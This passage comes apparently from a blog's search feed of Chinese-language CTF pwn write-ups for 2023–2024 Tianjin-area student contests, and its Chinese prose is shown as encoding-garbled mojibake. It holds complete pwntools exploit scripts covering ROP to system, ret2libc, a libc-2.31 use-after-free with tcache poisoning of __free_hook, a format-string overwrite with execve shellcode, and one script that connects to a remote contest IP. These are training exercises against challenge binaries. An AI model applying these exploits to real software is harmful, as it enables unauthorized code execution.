1/0&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi_ret)+p64(magic_addr)<br>payload += p64(ret_addr) + p64(system_plt)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="KyLinHeap"><a href="#KyLinHeap" class="headerlink" title="KyLinHeap"></a>KyLinHeap</h1><p>æ ‡å‡†èœå•é¢˜ï¼Œæœ‰ addã€deleteã€edit å’Œ show å‡½æ•°</p><img src="/post/44739/1735130120654-3838f58f-6cc9-4ee8-9da6-de065beef4a7.png" class="" title="img"><p>add å‡½æ•°</p><img src="/post/44739/1735130242326-10d29c09-6ac1-4f90-b483-1ca7128302be.png" class="" title="img"><p>delete å‡½æ•°å­˜åœ¨ UFA æ¼æ´</p><img src="/post/44739/1735130350757-d4c1244e-64f6-4eb8-987b-0833774838b4.png" class="" title="img"><p>edit å‡½æ•°ä¸å­˜åœ¨æº¢å‡º</p><img src="/post/44739/1735130381304-ddc8ecf0-a902-4071-8ca0-bb50a3aab7a5.png" class="" title="img"><p>show å‡½æ•°</p><img src="/post/44739/1735130416327-9c53f22f-e20a-4460-894e-ee6ffef3498c.png" class="" title="img"><p>libc2.31 çš„ UAFï¼Œæ³„éœ²å‡º libc ä¹‹åæ‰“ tcache ä¸º free_hook</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31-0kylin9.2k0.2.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;adventurer? &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;bytes): &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;bytes):&quot;</span>)<br>p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;index (0-19): &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>p.recvuntil(<span class="hljs-string">b&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><span class="hljs-comment"># attach(p)</span><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#chunk 0</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#chunk 1</span><br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&#x27;system:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(system)))<br>one_gadget = libc_base + <span class="hljs-number">0xe6c81</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x100</span>, p64(system))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024å¹´äº¬æ´¥å†€å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›-åˆèµ›Pwn</title>
    <link href="/post/41677.html"/>
    <url>/post/41677.html</url>
    
    <content type="html"><![CDATA[<p>2024å¹´è¿™åœºæ‰“äº†ï¼ŒPwnä¸€å…±ä¸‰é“é¢˜ï¼Œå †é¢˜è¿˜æ˜¯æ²¡ç»™libcï¼Œæœ€åæ˜¯0è§£ã€‚</p><h1 id="likeputs"><a href="#likeputs" class="headerlink" title="likeputs"></a>likeputs</h1><p>vulnå‡½æ•°æœ‰æ ˆæº¢å‡ºï¼Œè€Œä¸”ç¨‹åºæœ‰systemï¼Œä½†æ˜¯æ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å‘ç°æœ‰cat flagå­—ç¬¦ä¸²ï¼Œå¦‚æœsystemçš„å‚æ•°æ˜¯cat flagå³system(â€˜cat flagâ€™)ï¼Œé‚£ä¹ˆå°±ä¼šå°†flagæ‰“å°å‡ºæ¥ã€‚å› æ­¤åªéœ€è¦æ„é€ ä¸€ä¸ªç®€å•çš„ropï¼Œä½¿å¾—systemçš„å‚æ•°ä¸ºcat flagï¼Œå°±èƒ½æ‰“å°flagã€‚</p><img src="/post/41677/1725704829145-3bc1e164-061a-4655-8fb5-1eb521fbf747.png" class="" title="img"><img src="/post/41677/1725704849717-c5b05968-3906-4b5c-86e8-fe7db307e086.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;119.23.41.54&#x27;</span>, <span class="hljs-number">39091</span>)<br><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400753</span><br>flag_addr = <span class="hljs-number">0x400797</span><br>ret_addr = <span class="hljs-number">0x400506</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(flag_addr) <br>payload += p64(ret_addr) +  p64(system_plt) <br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/post/41677/1725683643285-a3c9f395-a07a-49a1-8e9b-c02bd4ef0d77.png" class="" title="img"><h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>ç¨‹åºä¸­é¦–å…ˆæ˜¯ä¸¤ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªæ˜¯ nameï¼Œä¸€ä¸ªæ˜¯ flagï¼Œç„¶åä¼šä½¿ç”¨ä¸€ä¸ª for å¾ªç¯æ¥å°†è¾“å…¥ name çš„å­˜å‚¨åˆ° name æ•°ç»„çš„å‰ 40 ä¸ªä½ç½®ï¼Œå³ name[0] åˆ° name[39]ï¼Œè€Œ name[40] åˆ™æ˜¯ .&#x2F;flag æ–‡ä»¶çš„å†…å®¹ï¼Œå¾ªç¯ä¸­ä½¿ç”¨ if æ¥æ¯”è¾ƒ name[40] å¼€å§‹æ˜¯å¦ç­‰äºè¾“å…¥çš„ flag çš„å†…å®¹ã€‚</p><p>ä»–å…¶å®æ˜¯ä».&#x2F;flag æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦åˆ° name[40] ä¸­ï¼Œç„¶åå†å’Œè¾“å…¥çš„ flag æ¯”å¯¹ï¼Œæ¯”å¯¹æ­£ç¡®å†æ¬¡è¯»å–.&#x2F;flag æ–‡ä»¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¯¹é”™è¯¯ä¹‹åè·³å‡ºå¾ªç¯ï¼›é‚£ä¹ˆå½“æ¯”å¯¹é”™è¯¯æ—¶ï¼Œname[40] æ—¶ä¸­æ˜¯æ­£ç¡®çš„ flag çš„ä¸€ä¸ªå­—ç¬¦ï¼Œé€šè¿‡ä¹‹åçš„ pirntf æ‰“å° name çš„å†…å®¹ï¼Œè¿™ä¸€ä¸ªå­—ç¬¦ä¹Ÿä¼šæ‰“å°å‡ºæ¥ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æº¢å‡ºçš„è¿™ä¸€ä¸ªå­—ç¬¦æ¥å¾ªç¯çˆ†ç ´</p><img src="/post/41677/1735046396801-1b2253f3-7158-4dfc-a559-583286a33002.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br><span class="hljs-built_in">print</span>(flag)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;Please give me your flag:&quot;</span>)<br>p.sendline(flag)<br>p.recvuntil(<span class="hljs-string">b&quot;Sorry &quot;</span>+payload)<br>two = p.recv(<span class="hljs-number">1</span>)<br>flag += two<br>p.close()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023å¹´å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›-åˆèµ›Pwn</title>
    <link href="/post/51907.html"/>
    <url>/post/51907.html</url>
    
    <content type="html"><![CDATA[<p>2023å¹´è¿˜æ²¡æ‰“CTFï¼Œè¿™æ˜¯åé¢æ‹¿åˆ°é¢˜ç›®æ‰å†™çš„wpï¼Œè¿˜æœ‰å°±æ˜¯å †é¢˜æ²¡æœ‰ç»™libcï¼Œä¸çŸ¥é“æ€ä¹ˆæ‰“ã€‚</p><h1 id="skill"><a href="#skill" class="headerlink" title="skill"></a>skill</h1><p>ret2libc</p><p>addå‡½æ•°ï¼Œå¾€resultæ•°ç»„å†™å…¥å†…å®¹</p><img src="/post/51907/1734435833506-efcccdae-6b3a-4847-8302-126d2e837267-1735102388940-60.png" class="" title="img"><p>show å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯ifä¸­æœ‰å››ä¸ªåˆ¤æ–­ï¼Œéœ€è¦ç­‰äºsongã€jumpã€rapå’ŒNBAæ‰èƒ½æ‰§è¡Œåˆ°getså‡½æ•°ä»è€Œè¿›è¡Œæ ˆæº¢å‡º</p><img src="/post/51907/1734435807465-350a564a-d872-430d-9504-abbf7fee8837-1735102388941-61.png" class="" title="img"><p>è§£æ³•å¾ˆæ˜æ˜¾ï¼Œå…ˆåœ¨addå‡½æ•°ä¸­å†™å…¥songã€jumpã€rapå’ŒNBAï¼Œç„¶ååœ¨showå‡½æ•°æ‰“ret2libc</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4008B6</span><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x400297</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Input your skill: &quot;</span>)<br>p.sendline(content)<br><br>add(<span class="hljs-string">b&quot;song&quot;</span>)<br>add(<span class="hljs-string">b&quot;jump&quot;</span>)<br>add(<span class="hljs-string">b&quot;rap&quot;</span>)<br>add(<span class="hljs-string">b&quot;NBA&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="dragon-game"><a href="#dragon-game" class="headerlink" title="dragon_game"></a>dragon_game</h1><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´+shellcode</p><p>main å‡½æ•°ä¸­ï¼Œç¨‹åºä½¿ç”¨ malloc å‡½æ•°åˆ†é…äº†8ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°†è¿”å›çš„æŒ‡é’ˆèµ‹å€¼ç»™ secretï¼Œæ¥ç€å°† secret æŒ‡å‘çš„ç¬¬ä¸€ä¸ªåœ°å€çš„å€¼ç½®ä¸º 666ï¼Œå°† secret æŒ‡å‘çš„ç¬¬äºŒä¸ªåœ°å€çš„å€¼ç½®ä¸º 233ï¼›ç„¶åæ˜¯æ‰“å°äº† secret å’Œ secret[1] çš„åœ°å€ï¼Œä¹‹åè°ƒç”¨äº† vuln</p><img src="/post/51907/1734434203519-a535b810-1556-44b7-ba84-5a0b8a2d383a-1735102388941-62.png" class="" title="img"><p>vuln å‡½æ•°ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°è¢«è°ƒç”¨</p><img src="/post/51907/1734434912123-6fbca87a-e9db-4274-89ff-0f21a0d8f500-1735102388941-63.png" class="" title="img"><p>vuln1 å‡½æ•°ä¸­ï¼Œä¸»è¦é€»è¾‘å°±æ˜¯åˆ¤æ–­è¾“å…¥ east è¿˜æ˜¯ westï¼Œé€‰æ‹© east æ‰å¯ä»¥è¿”å›ä»è€Œæ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°ï¼Œé€‰æ‹© west ä¼šé€€å‡º</p><img src="/post/51907/1734434969108-2c0a5f39-bfb8-427b-9382-cfe2121221cc-1735102388941-64.png" class="" title="img"><p>vuln2 å‡½æ•°ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="/post/51907/1734435204370-2d0b3e88-0b50-436b-863c-04d814246ac7-1735102388941-65.png" class="" title="img"><p>vuln3 å‡½æ•°ï¼Œresult çš„å€¼ç­‰äº secret[1] å³ 233ï¼Œç„¶ååˆ¤æ–­ secret æ˜¯å¦ç­‰äº resultï¼›if ä¸­å°† buf ç”¨ mmap å‡½æ•°è®¾ç½®æˆäº†å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åç”¨ read å¯¹ buf è¿›è¡Œè¯»å…¥</p><img src="/post/51907/1734435262487-0b599027-957d-4b5b-8c9a-2a4ea4f395a5-1735102388941-66.png" class="" title="img"><p>æ€è·¯å¾ˆæ˜æ˜¾å°±æ˜¯åœ¨ vuln3 å‡½æ•°ä¸­å¾€ buf æ³¨å…¥ shellcodeï¼Œä½†æ˜¯éœ€è¦ secret ç­‰äº resultï¼Œæˆ‘ä»¬çŸ¥é“ secret æ˜¯ 666ï¼Œè€Œ result æ˜¯ 233ï¼›æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ vuln2 å‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°† secret æ”¹æˆ 233 ï¼Œæˆ–è€…å°† secret[1] æ”¹æˆ 666</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret)))<br>p.recvuntil(<span class="hljs-string">&quot;secret[1] is &quot;</span>)<br>secret1 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret1:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret1)))<br><br><span class="hljs-comment"># attach(p, &#x27;b *0x400A37&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;east or west?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;11&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;And, you wish is:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%233c&#x27;</span> + <span class="hljs-string">b&#x27;%10$n&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(secret)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 59</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
